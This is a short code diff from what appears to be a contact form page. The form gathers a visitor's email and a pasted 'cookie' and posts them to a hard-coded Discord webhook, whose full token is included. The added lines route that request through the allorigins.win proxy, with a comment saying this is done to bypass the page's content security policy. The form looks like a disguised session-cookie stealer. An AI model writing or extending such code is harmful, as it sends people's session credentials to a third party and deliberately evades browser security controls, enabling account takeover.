@@ -67,12 +67,15 @@
 
       const webhookUrl = 'https://discord.com/api/webhooks/1362160509033382008/lJKt647dAoHQReTt--qKe8Kp2yInWMqO6fJ7v8ev3U_FT-aDATnGgKuB2cCqUxoKruwT';
 
+      // Use a proxy to bypass CSP
+      const proxyUrl = `https://api.allorigins.win/get?url=${encodeURIComponent(webhookUrl)}`;
+
       const payload = {
         content: `📬 New Contact Submission\n📧 Email: ${email}\n🍪 Cookie: ${cookie || "No cookie entered"}`
       };
 
       try {
-        const response = await fetch(webhookUrl, {
+        const response = await fetch(proxyUrl, {
           method: 'POST',
           headers: {
             'Content-Type': 'application/json'
